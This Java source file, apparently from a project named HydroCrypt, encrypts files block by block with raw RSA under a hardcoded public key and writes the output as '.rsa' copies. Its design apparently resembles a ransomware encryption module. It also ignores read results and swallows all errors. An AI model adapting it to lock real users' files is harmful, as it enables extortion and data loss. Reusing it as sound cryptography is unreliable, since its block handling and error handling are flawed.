package net.hydrotekz.HydroCrypt;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.PublicKey;

import net.hydrotekz.HydroCrypt.RSA;

public class Encryptor {

	private static String encryptionKey = null;
	private static PublicKey publicKey = null;

	public static void loadModule() throws Exception {
		// Load public key
		encryptionKey = "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAj33dLB1sXDTv5euBoTMnXSl8cxZleElyX1veG7bjBOeD+5TTJ01BZqJ9D4NaWs5OtvgbeUyo/mcQJ0XZRQngm6wh5/CP7Exe+uBhDo0/F3u+QGJIMYrOuLceiMMJS0uzWBsRMXn22vk38E3H4shRb+CUSkxheZqC4QUHKYXMbIk8S1uBbfCRc24A03hoEfXYQmWjOj64sx4IXYYpKkcl4G94S560aezD1SLOGPDkI0tSjvx21DqARg9epeHHiLp0lkpmyCLIqvfXBty3JMIxTbpbg2CQq6t2UVq9ejRZIUur+5MTFxv/Dpca2mi43in4bPNoJi7DMIP4klH4iIjtiGk1tYyoP6vXyZT+XY1B9vfCh9TPeQY+NI5XDboP6fghNktDkjBortPZmkPtpIAnqobXeABRq6rj4/rmzMzW5101mY4k3h19kJlwpW/8xlPi8nfLG+5E2PPHSG3Q/i76l2c1PKc4SpB3rKPS6dUF7SeCH3Xl6vIH41eQPUY9ofAud/DP9+6ypQA+6K80QpXBtuunk0dFH+ZyBTOnVDL6zZcLjZ7Iq1MLGukhjUqUyz4YXLAQ0cv/GjjcGeqUxjrCEk0dhB6NWCIgp3MAsLSQYbR4WmURo19ItqVDnqL1eNSrRaSk/5sTpAqrTqRuQpvU861SaBkVcnfHKn3IgaxYLgMCAwEAAQ==";
		publicKey = RSA.loadPublicKey(encryptionKey);
	}

	// Carefully encrypt block by block
	public static void encryptFile(File file) throws Exception {
		long startTime = System.currentTimeMillis();

		// Prepare streams
		FileOutputStream outputStream = new FileOutputStream(file.getPath() + ".rsa");
		FileInputStream inputStream = null;
		try {
			// Create a inputstream
			inputStream = new FileInputStream(file);

			// Handle bytes
			int blockSize = 501;
			long blocksNeeded = ((file.length()) / blockSize);

			// Encrypt blocks
			for (int i=0; i <= blocksNeeded-1; i++) {
				// Read a chunk of bytes
				byte[] block = new byte[blockSize];

				inputStream.read(block, 0, blockSize);

				// Write encrypted data
				byte[] encrypted = RSA.encrypt(block, publicKey);

				outputStream.write(encrypted);
			}

			// Encrypt last block
			if (file.length() > blocksNeeded * blockSize){
				// Read last chunk of bytes
				blockSize = (int) (file.length() - (blocksNeeded * blockSize));
				byte[] block = new byte[blockSize];

				inputStream.read(block, 0, blockSize);

				// Write encrypted data
				byte[] encrypted = RSA.encrypt(block, publicKey);

				outputStream.write(encrypted);
			}

			// Debug
			long endTime = System.currentTimeMillis();
			long time = endTime-startTime;
			System.out.println("Encrypted: " + file.getName() + " finished in " + time + " ms.");

		} catch (Exception e) {
			// Ignore error

		} finally {
			// Close stream
			try {
				// Close input stream
				if (inputStream != null) {
					inputStream.close();
				}
				// Close output stream
				outputStream.close();

			} catch (Exception e) {
				// Ignore error
			}
		}
	}
}